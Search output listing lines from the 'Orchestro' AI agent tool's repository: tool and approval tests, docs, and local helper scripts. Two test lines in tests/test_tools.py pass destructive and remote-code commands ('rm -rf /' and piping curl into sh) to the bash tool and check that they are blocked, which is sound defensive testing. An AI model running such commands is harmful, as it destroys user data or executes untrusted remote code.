tests/test_tools.py:102:    f = tmp_path / "hello.txt"
tests/test_tools.py:104:    result = registry.run("read_file", "hello.txt", tmp_path)
tests/test_tools.py:109:def test_read_file_missing_raises_or_fails(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:113:        registry.run("read_file", "missing.txt", tmp_path)
tests/test_tools.py:116:def test_read_file_empty_arg_raises(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:117:    with pytest.raises(ValueError, match="requires a relative path"):
tests/test_tools.py:118:        registry.run("read_file", "", tmp_path)
tests/test_tools.py:121:def test_read_file_metadata_includes_path(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:122:    f = tmp_path / "meta.txt"
tests/test_tools.py:124:    result = registry.run("read_file", "meta.txt", tmp_path)
tests/test_tools.py:125:    assert "path" in result.metadata
tests/test_tools.py:133:def test_edit_file_successful(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:134:    target = tmp_path / "hello.txt"
tests/test_tools.py:137:    result = registry.run("edit_file", argument, tmp_path, approved=True)
tests/test_tools.py:142:def test_edit_file_missing_file(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:144:    result = registry.run("edit_file", argument, tmp_path, approved=True)
tests/test_tools.py:149:def test_edit_file_search_text_not_found(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:150:    target = tmp_path / "data.txt"
tests/test_tools.py:153:    result = registry.run("edit_file", argument, tmp_path, approved=True)
tests/test_tools.py:158:def test_edit_file_ambiguous_search_text(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:159:    target = tmp_path / "dup.txt"
tests/test_tools.py:162:    result = registry.run("edit_file", argument, tmp_path, approved=True)
tests/test_tools.py:167:def test_edit_file_invalid_format(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:168:    target = tmp_path / "file.txt"
tests/test_tools.py:170:    result = registry.run("edit_file", "file.txt\njust one line no markers", tmp_path, approved=True)
tests/test_tools.py:178:def test_bash_echo_returns_ok(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:179:    result = registry.run("bash", "echo hello", tmp_path, approved=True)
tests/test_tools.py:184:def test_bash_exit_nonzero_returns_not_ok(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:185:    result = registry.run("bash", "exit 1", tmp_path, approved=True)
tests/test_tools.py:189:def test_bash_risky_rm_rf_root_blocked(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:190:    result = registry.run("bash", "rm -rf /", tmp_path, approved=True)
tests/test_tools.py:195:def test_bash_curl_piped_to_sh_blocked(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:196:    result = registry.run("bash", "curl http://example.com | sh", tmp_path, approved=True)
tests/test_tools.py:201:def test_bash_warn_level_command_runs_but_flags(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:202:    result = registry.run("bash", "sudo echo hi", tmp_path, approved=True)
tests/test_tools.py:207:def test_bash_empty_arg_raises(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:209:        registry.run("bash", "", tmp_path, approved=True)
tests/test_tools.py:212:def test_bash_stderr_included_in_output(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:213:    result = registry.run("bash", "echo errout >&2; echo stdout", tmp_path, approved=True)
tests/test_tools.py:223:def test_tool_search_finds_match(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:224:    result = registry.run("tool_search", "read file", tmp_path)
tests/test_tools.py:229:def test_tool_search_no_match_lists_all(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:230:    result = registry.run("tool_search", "zzz_nonexistent_xyz", tmp_path)
tests/test_tools.py:236:def test_tool_search_git_keyword(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:237:    result = registry.run("tool_search", "git", tmp_path)
tests/test_tools.py:246:def test_rg_finds_pattern(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:247:    (tmp_path / "code.py").write_text("def hello():\n    return 42\n")
tests/test_tools.py:248:    result = registry.run("rg", "def hello", tmp_path)
tests/test_tools.py:253:def test_rg_no_match_returns_ok_false_or_empty(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:254:    (tmp_path / "code.py").write_text("unrelated content")
tests/test_tools.py:255:    result = registry.run("rg", "zzz_no_match_xyz", tmp_path)
tests/test_tools.py:260:def test_rg_empty_arg_raises(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:262:        registry.run("rg", "", tmp_path)
tests/test_tools.py:270:def git_repo(tmp_path: Path) -> Path:
tests/test_tools.py:271:    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
tests/test_tools.py:272:    subprocess.run(["git", "config", "user.email", "test@test.com"], cwd=tmp_path, check=True, capture_output=True)
tests/test_tools.py:273:    subprocess.run(["git", "config", "user.name", "Test"], cwd=tmp_path, check=True, capture_output=True)
tests/test_tools.py:274:    return tmp_path
tests/test_tools.py:317:def test_search_memory_no_db(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:318:    result = registry.run("search_memory", "query", tmp_path)
tests/test_tools.py:323:def test_search_memory_empty_query(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:324:    result = registry_with_db.run("search_memory", "", tmp_path)
tests/test_tools.py:329:def test_search_memory_no_results(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:330:    result = registry_with_db.run("search_memory", "xyzzy_not_stored", tmp_path)
tests/test_tools.py:335:def test_propose_fact_no_db(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:336:    result = registry.run("propose_fact", "key value", tmp_path, approved=True)
tests/test_tools.py:341:def test_propose_fact_missing_value(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:342:    result = registry_with_db.run("propose_fact", "only_key", tmp_path, approved=True)
tests/test_tools.py:347:def test_propose_fact_stores_fact(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:348:    result = registry_with_db.run("propose_fact", "capital France", tmp_path, approved=True)
tests/test_tools.py:355:def test_propose_fact_with_source_flag(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:357:        "propose_fact", "color sky --source wikipedia", tmp_path, approved=True
tests/test_tools.py:363:def test_propose_correction_no_db(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:364:    result = registry.run("propose_correction", "ctx|||wrong|||right", tmp_path, approved=True)
tests/test_tools.py:369:def test_propose_correction_missing_parts(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:370:    result = registry_with_db.run("propose_correction", "only_one_part", tmp_path, approved=True)
tests/test_tools.py:375:def test_propose_correction_stores_correction(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:379:        tmp_path,
tests/test_tools.py:386:def test_propose_correction_with_domain(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:390:        tmp_path,
tests/test_tools.py:397:def test_propose_correction_empty_parts_rejected(registry_with_db: ToolRegistry, tmp_path: Path):
tests/test_tools.py:399:        "propose_correction", "|||wrong|||right", tmp_path, approved=True
docs/plugins.md:116:curl http://127.0.0.1:8765/plugins
docs/plugins.md:122:- Avoid long-running network work in hooks unless you want that latency in the core run path.
docs/plugins.md:126:For related integration surfaces, see [MCP](mcp.md), [Shell Mode](shell.md), and [API Reference](api-reference.md).
tests/test_tasks.py:3:from pathlib import Path
tests/test_tasks.py:118:def test_passing_command_returns_true(tmp_path: Path):
tests/test_tasks.py:119:    passed, results = run_acceptance_tests(["true"], cwd=tmp_path)
tests/test_tasks.py:124:def test_failing_command_returns_false(tmp_path: Path):
tests/test_tasks.py:125:    passed, results = run_acceptance_tests(["false"], cwd=tmp_path)
tests/test_tasks.py:130:def test_multiple_tests_all_pass(tmp_path: Path):
tests/test_tasks.py:131:    passed, results = run_acceptance_tests(["true", "true"], cwd=tmp_path)
tests/test_tasks.py:136:def test_one_failing_marks_all_failed(tmp_path: Path):
tests/test_tasks.py:137:    passed, results = run_acceptance_tests(["true", "false"], cwd=tmp_path)
tests/test_tasks.py:141:def test_results_include_test_command(tmp_path: Path):
tests/test_tasks.py:142:    _, results = run_acceptance_tests(["true"], cwd=tmp_path)
tests/test_tasks.py:146:def test_output_captured(tmp_path: Path):
tests/test_tasks.py:147:    _, results = run_acceptance_tests(["echo hello"], cwd=tmp_path)
tests/test_tasks.py:151:def test_nonexistent_command_returns_false(tmp_path: Path):
tests/test_tasks.py:152:    passed, results = run_acceptance_tests(["this-command-xyz-does-not-exist"], cwd=tmp_path)
docs/deployment.md:3:This guide covers practical deployment shapes for Orchestro beyond “run it once in a shell.”
docs/deployment.md:28:export ORCHESTRO_HOME=/path/to/orchestro-home
docs/deployment.md:84:curl http://127.0.0.1:8765/health
docs/deployment.md:85:curl http://127.0.0.1:8765/backends
tests/test_quality.py:29:    for name in ("plan-execute", "debate", "pipeline", "custom"):
docs/documentation-gaps.md:15:- [Shell Mode](shell.md)
scripts/vllm-port-forward.sh:9:exec sudo kubectl -n "$NAMESPACE" port-forward "svc/$SERVICE" "${LOCAL_PORT}:${REMOTE_PORT}"
tests/test_routing.py:52:    assert s.avg_tokens == 0.0
tests/test_routing.py:138:            avg_tokens=1500.0,
docs/shell.md:3:The interactive shell is Orchestro’s terminal-first operator UI. It is not just a wrapper around `ask`; it carries session state, default backend/strategy/domain, background jobs, plan workflows, approvals, and review commands.
docs/shell.md:9:1. [Starting The Shell](#starting-the-shell)
docs/shell.md:12:4. [Modes Sessions And Plans](#modes-sessions-and-plans)
docs/shell.md:20:orchestro shell --backend auto
docs/shell.md:37:Or, with a session:
docs/shell.md:40:orchestro[act:<cwd>:s=<session-prefix>]>
docs/shell.md:45:The shell keeps local operator state:
docs/shell.md:52:- current session
docs/shell.md:56:Free text runs a goal. Slash commands mutate or inspect shell state.
docs/shell.md:126:- `/session ...`
docs/shell.md:137:The shell is the richest operator surface for plans because it can drive plan execution and background jobs in one place.
docs/shell.md:147:- `autonomous` changes how some execution paths handle approval gating
docs/shell.md:178:- Use `/help` often. The shell has more surface area than the plain CLI.
docs/shell.md:179:- Use sessions if you want related work compacted and resumable.
docs/shell.md:182:- Use the shell for daily-driver use, and the plain CLI/API for scripting.
scripts/reindex-ollama-embeddings.sh:17:ORCHESTRO_EMBED_BASE_URL="${ORCHESTRO_EMBED_BASE_URL:-http://127.0.0.1:11434/v1}" \
scripts/seed-interactions.py:29:from pathlib import Path
scripts/seed-interactions.py:33:sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
scripts/seed-interactions.py:36:from orchestro.paths import db_path
scripts/seed-interactions.py:92:    "How do I rotate a Kubernetes secret without restarting the pod?",
scripts/seed-interactions.py:161:        # Simulate token usage.
scripts/seed-interactions.py:162:        prompt_tokens = rng.randint(200, 2000)
scripts/seed-interactions.py:163:        completion_tokens = rng.randint(50, 800)
scripts/seed-interactions.py:164:        db.update_run_token_usage(
scripts/seed-interactions.py:166:            prompt_tokens=prompt_tokens,
scripts/seed-interactions.py:167:            completion_tokens=completion_tokens,
scripts/seed-interactions.py:168:            total_tokens=prompt_tokens + completion_tokens,
scripts/seed-interactions.py:210:    db_file = args.db or db_path()
scripts/seed-interactions.py:220:        total = conn.execute("SELECT COUNT(*) FROM interactions").fetchone()[0]
scripts/seed-interactions.py:221:        rated = conn.execute("SELECT COUNT(*) FROM ratings WHERE target_type = 'run'").fetchone()[0]
scripts/ollama-port-forward.sh:9:exec sudo kubectl -n "$NAMESPACE" port-forward "svc/$SERVICE" "${LOCAL_PORT}:${REMOTE_PORT}"
tests/test_git_changes.py:3:from pathlib import Path
tests/test_git_changes.py:46:    def test_returns_tuple_of_code_stdout_stderr(self, tmp_path: Path):
tests/test_git_changes.py:47:        code, out, err = git_capture(tmp_path, ["--version"])
tests/test_git_changes.py:52:    def test_nonzero_code_on_bad_command(self, tmp_path: Path):
tests/test_git_changes.py:53:        code, out, err = git_capture(tmp_path, ["this-command-does-not-exist"])
tests/test_git_changes.py:56:    def test_stdout_rstripped(self, tmp_path: Path):
tests/test_git_changes.py:57:        code, out, _ = git_capture(tmp_path, ["--version"])
tests/test_git_changes.py:66:    def test_non_git_dir_returns_ok_false(self, tmp_path: Path):
tests/test_git_changes.py:67:        # tmp_path is not a git repo
tests/test_git_changes.py:68:        result = collect_git_changes(tmp_path)
docs/testing-and-operations.md:13:7. [Data And Export Paths](#data-and-export-paths)
docs/testing-and-operations.md:71:- session creation and compaction
docs/testing-and-operations.md:82:- `session-new`
docs/testing-and-operations.md:83:- `session-compact`
docs/testing-and-operations.md:114:- fail on real wrapper or execution errors
docs/testing-and-operations.md:137:- `--home <path>`
docs/testing-and-operations.md:141:Using a fresh `--home` path is the cleanest way to inspect routing without prior DB history skewing the decision.
docs/benchmarks.md:21:- execute each case through Orchestro
docs/benchmarks.md:91:- aggregate metrics such as token usage, wall time, tool calls, recovery attempts, and quality distribution
tests/test_approvals.py:4:from pathlib import Path
tests/test_approvals.py:36:    def test_returns_empty_when_file_missing(self, tmp_path: Path):
tests/test_approvals.py:37:        store = ToolApprovalStore(path=tmp_path / "approvals.json")
tests/test_approvals.py:40:    def test_returns_patterns_from_file(self, tmp_path: Path):
tests/test_approvals.py:41:        p = tmp_path / "approvals.json"
tests/test_approvals.py:43:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:46:    def test_missing_allow_key_returns_empty(self, tmp_path: Path):
tests/test_approvals.py:47:        p = tmp_path / "approvals.json"
tests/test_approvals.py:49:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:52:    def test_non_string_items_coerced_to_str(self, tmp_path: Path):
tests/test_approvals.py:53:        p = tmp_path / "approvals.json"
tests/test_approvals.py:55:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:65:    def test_exact_match(self, tmp_path: Path):
tests/test_approvals.py:66:        p = tmp_path / "approvals.json"
tests/test_approvals.py:68:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:71:    def test_no_match(self, tmp_path: Path):
tests/test_approvals.py:72:        p = tmp_path / "approvals.json"
tests/test_approvals.py:74:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:75:        assert store.is_allowed("read_file", "secrets.env") is False
tests/test_approvals.py:77:    def test_glob_wildcard_match(self, tmp_path: Path):
tests/test_approvals.py:78:        p = tmp_path / "approvals.json"
tests/test_approvals.py:80:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:83:    def test_glob_prefix_match(self, tmp_path: Path):
tests/test_approvals.py:84:        p = tmp_path / "approvals.json"
tests/test_approvals.py:86:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:90:    def test_tool_only_pattern(self, tmp_path: Path):
tests/test_approvals.py:91:        p = tmp_path / "approvals.json"
tests/test_approvals.py:93:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:97:    def test_no_file_returns_false(self, tmp_path: Path):
tests/test_approvals.py:98:        store = ToolApprovalStore(path=tmp_path / "missing.json")
tests/test_approvals.py:101:    def test_case_sensitive_match(self, tmp_path: Path):
tests/test_approvals.py:102:        p = tmp_path / "approvals.json"
tests/test_approvals.py:104:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:113:    def test_creates_file_when_missing(self, tmp_path: Path):
tests/test_approvals.py:114:        p = tmp_path / "sub" / "approvals.json"
tests/test_approvals.py:115:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:121:    def test_appends_to_existing(self, tmp_path: Path):
tests/test_approvals.py:122:        p = tmp_path / "approvals.json"
tests/test_approvals.py:124:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:130:    def test_no_duplicate(self, tmp_path: Path):
tests/test_approvals.py:131:        p = tmp_path / "approvals.json"
tests/test_approvals.py:133:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:138:    def test_written_as_sorted_keys(self, tmp_path: Path):
tests/test_approvals.py:139:        p = tmp_path / "approvals.json"
tests/test_approvals.py:140:        store = ToolApprovalStore(path=p)
tests/test_approvals.py:145:    def test_after_remember_is_allowed(self, tmp_path: Path):
tests/test_approvals.py:146:        p = tmp_path / "approvals.json"
tests/test_approvals.py:147:        store = ToolApprovalStore(path=p)
docs/collections.md:44:- `source_path`
docs/collections.md:101:- phrase and token matching matter
docs/collections.md:105:If you need semantic retrieval, use the main retrieval and embedding/indexing paths instead.
tests/test_mcp_client.py:4:from pathlib import Path
tests/test_mcp_client.py:117:    def test_load_config_returns_empty_when_no_file(self, tmp_path: Path):
tests/test_mcp_client.py:119:        configs = mgr.load_config(config_dir=tmp_path)
tests/test_mcp_client.py:122:    def test_load_config_parses_servers(self, tmp_path: Path):
tests/test_mcp_client.py:129:        (tmp_path / "mcp_servers.json").write_text(json.dumps(payload))
tests/test_mcp_client.py:131:        configs = mgr.load_config(config_dir=tmp_path)
docs/api-operations.md:9:3. [State And Data Paths](#state-and-data-paths)
docs/api-operations.md:21:- run execution
docs/api-operations.md:22:- tool execution
docs/api-operations.md:23:- plan/session management
docs/api-operations.md:38:- use it behind your own local reverse proxy only if you know why
docs/api-operations.md:53:export ORCHESTRO_HOME=/path/to/orchestro-home
docs/api-operations.md:58:- SQLite DB path
docs/api-operations.md:79:- tool-running surfaces may execute shell commands if the tool and approval path allow it
scripts/vllm-smoke.sh:4:BASE_URL="${ORCHESTRO_OPENAI_BASE_URL:-http://127.0.0.1:8000/v1}"
scripts/vllm-smoke.sh:25:  "Use tool-loop. Determine the current working directory and return only that path." \
tests/test_collections.py:3:from pathlib import Path
tests/test_collections.py:215:    def test_reads_and_ingests_txt(self, tmp_path: Path):
tests/test_collections.py:216:        txt = tmp_path / "doc.txt"
tests/test_collections.py:222:    def test_uses_markdown_chunker_for_md(self, tmp_path: Path):
tests/test_collections.py:223:        md = tmp_path / "readme.md"
tests/test_collections.py:230:    def test_uses_paragraph_chunker_for_txt(self, tmp_path: Path):
tests/test_collections.py:231:        txt = tmp_path / "notes.txt"
tests/test_collections.py:237:    def test_custom_strategy_used(self, tmp_path: Path):
tests/test_collections.py:238:        txt = tmp_path / "doc.txt"
tests/test_collections.py:245:    def test_source_ref_is_filename(self, tmp_path: Path):
tests/test_collections.py:246:        txt = tmp_path / "notes.txt"
tests/test_collections.py:259:    def test_ingests_all_md_files(self, tmp_path: Path):
tests/test_collections.py:260:        (tmp_path / "a.md").write_text("# A\nContent.", encoding="utf-8")
tests/test_collections.py:261:        (tmp_path / "b.md").write_text("# B\nContent.", encoding="utf-8")
tests/test_collections.py:263:        count = ingest_directory(db, "col", tmp_path)
tests/test_collections.py:266:    def test_ingests_txt_files(self, tmp_path: Path):
tests/test_collections.py:267:        (tmp_path / "doc.txt").write_text("Hello world.", encoding="utf-8")
tests/test_collections.py:269:        count = ingest_directory(db, "col", tmp_path)
tests/test_collections.py:272:    def test_skips_non_allowed_extensions(self, tmp_path: Path):
tests/test_collections.py:273:        (tmp_path / "script.py").write_text("print('hi')", encoding="utf-8")
tests/test_collections.py:275:        count = ingest_directory(db, "col", tmp_path)
tests/test_collections.py:279:    def test_custom_extensions_filter(self, tmp_path: Path):
tests/test_collections.py:280:        (tmp_path / "code.py").write_text("x = 1\n\ny = 2", encoding="utf-8")
tests/test_collections.py:281:        (tmp_path / "readme.md").write_text("# Doc", encoding="utf-8")
tests/test_collections.py:283:        count = ingest_directory(db, "col", tmp_path, extensions=[".py"])
tests/test_collections.py:293:    def test_recursive_subdirectories(self, tmp_path: Path):
tests/test_collections.py:294:        sub = tmp_path / "sub"
tests/test_collections.py:298:        count = ingest_directory(db, "col", tmp_path)
tests/test_collections.py:301:    def test_empty_directory_returns_zero(self, tmp_path: Path):
tests/test_collections.py:303:        count = ingest_directory(db, "col", tmp_path)
docs/examples.md:30:orchestro ask "Review this code path for risks" --model smart
docs/examples.md:47:orchestro session-new "Daily Driver"
docs/examples.md:49:orchestro session-compact <session-id> --limit 20
docs/examples.md:50:orchestro session-show <session-id>
docs/examples.md:58:orchestro plan-step-add <plan-id> 5 "Run the focused tests" "Verify the new routing path."
docs/examples.md:76:curl http://127.0.0.1:8765/health
docs/examples.md:77:curl http://127.0.0.1:8765/backends
docs/examples.md:83:curl -X POST http://127.0.0.1:8765/ask \
docs/examples.md:95:curl -N -X POST http://127.0.0.1:8765/ask/stream \
docs/examples.md:106:curl -X POST http://127.0.0.1:8765/tools/run \
docs/examples.md:114:### Create a session and compact it
docs/examples.md:117:curl -X POST http://127.0.0.1:8765/sessions \
docs/examples.md:121:curl -X POST "http://127.0.0.1:8765/sessions/<session-id>/compact?limit=20"
docs/examples.md:127:curl -X POST http://127.0.0.1:8765/plans \
docs/examples.md:213:curl http://127.0.0.1:8765/plugins
tests/test_bench.py:4:from pathlib import Path
tests/test_bench.py:66:        assert m.avg_tokens == 0.0
tests/test_bench.py:136:    def _write_suite(self, tmp_path: Path, payload: dict) -> Path:
tests/test_bench.py:137:        p = tmp_path / "suite.json"
tests/test_bench.py:141:    def test_returns_suite_name_and_cases(self, tmp_path: Path):
tests/test_bench.py:148:        p = self._write_suite(tmp_path, payload)
tests/test_bench.py:154:    def test_suite_name_defaults_to_stem(self, tmp_path: Path):
tests/test_bench.py:156:        p = self._write_suite(tmp_path, payload)
tests/test_bench.py:161:    def test_optional_fields_are_loaded(self, tmp_path: Path):
tests/test_bench.py:178:        p = self._write_suite(tmp_path, payload)
tests/test_bench.py:187:    def test_multiple_cases(self, tmp_path: Path):
tests/test_bench.py:195:        p = self._write_suite(tmp_path, payload)
scripts/ollama-ephemeral.sh:18:  ./scripts/ollama-ephemeral.sh -- curl http://127.0.0.1:11434/api/tags
scripts/ollama-ephemeral.sh:82:    if curl -fsS "http://127.0.0.1:${LOCAL_PORT}/" >/dev/null 2>&1; then
scripts/ollama-ephemeral.sh:87:  curl -fsS "http://127.0.0.1:${LOCAL_PORT}/" >/dev/null
tests/test_planner.py:3:from pathlib import Path
tests/test_planner.py:146:    def test_backend_failure_reason_recorded_in_fallback_notes(self, tmp_path: Path):
tests/test_planner.py:156:            working_directory=tmp_path,
docs/database-schema.md:13:5. [Plan And Session Tables](#plan-and-session-tables)
docs/database-schema.md:23:- override: `ORCHESTRO_HOME=/path/to/home`
docs/database-schema.md:31:Primary execution record.
docs/database-schema.md:37:- session linkage
docs/database-schema.md:42:- token usage
docs/database-schema.md:87:### `shell_jobs`
docs/database-schema.md:89:Background shell job metadata.
docs/database-schema.md:91:### `shell_job_events`
docs/database-schema.md:95:### `shell_job_inputs`
docs/database-schema.md:97:Deferred operator input injected into a shell job.
docs/database-schema.md:101:Persisted approval queue for tools and long-running shell jobs.
docs/database-schema.md:107:### `sessions`
docs/database-schema.md:158:- source path or URL
docs/database-schema.md:187:These tables support the retrieval/indexing path documented in [Testing And Operations](testing-and-operations.md) and the architectural intent in [Architecture](architecture.md).
tests/test_new_tools.py:3:from pathlib import Path
tests/test_new_tools.py:45:def test_spawn_subagent_tool_exists_confirm_approval(registry: ToolRegistry):
tests/test_new_tools.py:46:    tool = registry.get_tool("spawn_subagent")
tests/test_new_tools.py:51:def test_search_memory_no_db_returns_memory_not_available(tmp_path: Path):
tests/test_new_tools.py:53:    result = reg.run("search_memory", "some query", tmp_path)
tests/test_new_tools.py:58:def test_propose_fact_no_db_returns_memory_not_available(tmp_path: Path):
tests/test_new_tools.py:60:    result = reg.run("propose_fact", "key value", tmp_path, approved=True)
tests/test_instructions.py:3:from pathlib import Path
tests/test_instructions.py:16:        s = InstructionSource(label="global", path=Path("/g.md"), content="Be concise.")
tests/test_instructions.py:18:        assert s.path == Path("/g.md")
tests/test_instructions.py:29:            InstructionSource(label="global", path=Path("/g.md"), content="   \n "),
tests/test_instructions.py:36:            InstructionSource(label="global", path=Path("/g.md"), content="Global rule."),
tests/test_instructions.py:37:            InstructionSource(label="project", path=Path("/p.md"), content="Project rule."),
tests/test_instructions.py:45:    def test_text_includes_label_and_path(self):
tests/test_instructions.py:47:            InstructionSource(label="global", path=Path("/g.md"), content="Content here."),
tests/test_instructions.py:57:            InstructionSource(label="a", path=Path("/a.md"), content="First."),
tests/test_instructions.py:58:            InstructionSource(label="b", path=Path("/b.md"), content="Second."),
tests/test_instructions.py:67:            InstructionSource(label="empty", path=Path("/e.md"), content=""),
tests/test_instructions.py:68:            InstructionSource(label="real", path=Path("/r.md"), content="Real content."),
tests/test_instructions.py:78:            InstructionSource(label="global", path=Path("/g.md"), content="Hello"),
tests/test_instructions.py:92:    def test_finds_orchestro_md_in_cwd(self, tmp_path: Path):
tests/test_instructions.py:93:        (tmp_path / "ORCHESTRO.md").write_text("# Project instructions")
tests/test_instructions.py:94:        result = find_project_instructions(tmp_path)
tests/test_instructions.py:98:    def test_finds_in_parent_directory(self, tmp_path: Path):
tests/test_instructions.py:99:        child = tmp_path / "sub" / "project"
tests/test_instructions.py:101:        (tmp_path / "ORCHESTRO.md").write_text("# Rules")
tests/test_instructions.py:106:    def test_returns_none_when_not_found(self, tmp_path: Path):
tests/test_instructions.py:107:        result = find_project_instructions(tmp_path / "no_such_dir")
tests/test_instructions.py:110:    def test_closest_ancestor_wins(self, tmp_path: Path):
tests/test_instructions.py:111:        inner = tmp_path / "inner"
tests/test_instructions.py:113:        (tmp_path / "ORCHESTRO.md").write_text("outer")
tests/test_instructions.py:121:    def test_empty_when_no_files(self, tmp_path: Path):
tests/test_instructions.py:122:        with patch("orchestro.instructions.global_instructions_path", return_value=tmp_path / "no.md"):
tests/test_instructions.py:123:            bundle = load_instruction_bundle(tmp_path / "empty")
tests/test_instructions.py:127:    def test_loads_global_instructions(self, tmp_path: Path):
tests/test_instructions.py:128:        global_md = tmp_path / "global.md"
tests/test_instructions.py:130:        with patch("orchestro.instructions.global_instructions_path", return_value=global_md):
tests/test_instructions.py:131:            bundle = load_instruction_bundle(tmp_path / "cwd")
tests/test_instructions.py:136:    def test_loads_project_instructions(self, tmp_path: Path):
tests/test_instructions.py:137:        (tmp_path / "ORCHESTRO.md").write_text("# Project instructions")
tests/test_instructions.py:138:        with patch("orchestro.instructions.global_instructions_path", return_value=tmp_path / "no.md"):
tests/test_instructions.py:139:            bundle = load_instruction_bundle(tmp_path)
tests/test_instructions.py:144:    def test_global_loaded_before_project(self, tmp_path: Path):
tests/test_instructions.py:145:        global_md = tmp_path / "global.md"
tests/test_instructions.py:147:        (tmp_path / "ORCHESTRO.md").write_text("Project content.")
tests/test_instructions.py:148:        with patch("orchestro.instructions.global_instructions_path", return_value=global_md):
tests/test_instructions.py:149:            bundle = load_instruction_bundle(tmp_path)
docs/trust-and-security.md:3:Orchestro is a local operator tool with powerful execution surfaces. This guide explains the practical trust model currently implemented in the codebase.
docs/trust-and-security.md:25:- treat local tool execution as privileged
docs/trust-and-security.md:51:Approval requests are also persisted in SQLite for background/shell flows.
docs/trust-and-security.md:65:- session overrides
docs/trust-and-security.md:72:4. session override
docs/trust-and-security.md:91:High-risk shell usage:
docs/trust-and-security.md:101:- prefer sessions and plan workflows for longer tasks so you can inspect the event trail
docs/trust-and-security.md:107:- [Shell Mode](shell.md)
scripts/vllm-ephemeral-check.sh:121:  if curl -fsS "http://127.0.0.1:${LOCAL_PORT}/health" >/dev/null 2>&1; then
scripts/vllm-ephemeral-check.sh:126:curl -fsS "http://127.0.0.1:${LOCAL_PORT}/health" >/dev/null
scripts/vllm-ephemeral-check.sh:130:  ORCHESTRO_OPENAI_BASE_URL="http://127.0.0.1:${LOCAL_PORT}/v1" \
scripts/vllm-ephemeral-check.sh:143:  ORCHESTRO_OPENAI_BASE_URL="http://127.0.0.1:${LOCAL_PORT}/v1" \
tests/test_streaming.py:22:            prompt_tokens=10,
tests/test_streaming.py:23:            completion_tokens=20,
tests/test_streaming.py:24:            total_tokens=30,
tests/test_streaming.py:29:        assert response.prompt_tokens == 10
tests/test_streaming.py:30:        assert response.completion_tokens == 20
tests/test_streaming.py:31:        assert response.total_tokens == 30
tests/test_constitutions.py:3:from pathlib import Path
tests/test_constitutions.py:16:        s = ConstitutionSource(label="project", path="/some/path.md", content="# Rules\n")
tests/test_constitutions.py:18:        assert s.path == "/some/path.md"
tests/test_constitutions.py:25:            ConstitutionSource(label="project", path="/p.md", content="A"),
tests/test_constitutions.py:26:            ConstitutionSource(label="global", path="/g.md", content="B"),
tests/test_constitutions.py:42:    def test_finds_constitutions_dir_in_cwd(self, tmp_path: Path):
tests/test_constitutions.py:43:        (tmp_path / "constitutions").mkdir()
tests/test_constitutions.py:44:        (tmp_path / "constitutions" / "coding.md").write_text("# Coding rules")
tests/test_constitutions.py:45:        result = find_project_constitution("coding", tmp_path)
tests/test_constitutions.py:49:    def test_finds_in_parent_directory(self, tmp_path: Path):
tests/test_constitutions.py:50:        parent = tmp_path
tests/test_constitutions.py:51:        child = tmp_path / "sub" / "project"
tests/test_constitutions.py:59:    def test_returns_none_when_not_found(self, tmp_path: Path):
tests/test_constitutions.py:60:        result = find_project_constitution("nonexistent", tmp_path)
tests/test_constitutions.py:63:    def test_domain_specific_file_only(self, tmp_path: Path):
tests/test_constitutions.py:64:        (tmp_path / "constitutions").mkdir()
tests/test_constitutions.py:65:        (tmp_path / "constitutions" / "coding.md").write_text("# Coding")
tests/test_constitutions.py:67:        result = find_project_constitution("writing", tmp_path)
tests/test_constitutions.py:70:    def test_closest_ancestor_wins(self, tmp_path: Path):
tests/test_constitutions.py:72:        outer = tmp_path
tests/test_constitutions.py:73:        inner = tmp_path / "inner"
tests/test_constitutions.py:85:    def test_no_domain_returns_empty(self, tmp_path: Path):
tests/test_constitutions.py:86:        bundle = load_constitution_bundle(None, tmp_path)
tests/test_constitutions.py:91:    def test_loads_project_constitution(self, tmp_path: Path):
tests/test_constitutions.py:92:        (tmp_path / "constitutions").mkdir()
tests/test_constitutions.py:93:        (tmp_path / "constitutions" / "coding.md").write_text("# Project rules")
